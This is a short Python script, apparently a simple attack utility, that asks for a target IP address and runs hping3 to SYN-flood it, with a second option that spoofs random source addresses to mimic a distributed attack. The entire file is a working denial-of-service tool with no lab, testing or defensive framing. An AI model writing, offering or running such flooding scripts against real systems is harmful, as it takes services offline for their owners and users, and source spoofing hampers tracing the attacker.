import sys
import subprocess
def ddos():
    print("1) Perform Dos Attack ")
    print("2) Perform DDos Attack ")
    option = input("Enter the Option : ")
    ip = input("Enter the Ip address : ")
    match option:
        case "1":
            try :
                 subprocess.run(["hping3","-S","--flood","-V",ip])
            except KeyboardInterrupt:
                print("Script interrupted by user .Exiting...")
                sys.exit(0)
        case "2":
            try :
                 subprocess.run(["hping3","-S","--flood","-V","--rand-source",ip])
            except KeyboardInterrupt:
                print("Script interrupted by user .Exiting...")
                sys.exit(0)
        case _:
            print("Invaild Option")